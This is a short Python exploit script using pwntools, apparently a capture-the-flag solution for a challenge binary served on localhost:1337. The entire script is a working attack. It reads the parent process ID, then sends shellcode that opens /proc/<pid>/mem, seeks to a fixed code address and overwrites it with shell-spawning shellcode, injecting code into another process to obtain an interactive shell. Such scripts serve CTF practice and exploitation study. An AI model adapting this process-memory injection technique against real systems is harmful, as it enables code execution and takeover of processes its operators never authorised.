#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("localhost", 1337)

    return r


def main():
    r = conn()

    parent_pid = int(r.recvregex(b'\d{1,6}\n', capture=True).group().strip())
    info(f'parent pid: {parent_pid}')

    parent_shellcode = shellcraft.sh()
    asm_parent_shellcode = asm(parent_shellcode)

    shellcode = shellcraft.open(f'/proc/{parent_pid}/mem', 2) + shellcraft.lseek('rax', 0x401c8f, 0) + shellcraft.write(3, asm_parent_shellcode, len(asm_parent_shellcode)) + shellcraft.exit(0)

    print(shellcode)

    r.sendlineafter(b'shellcode:', asm(shellcode))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
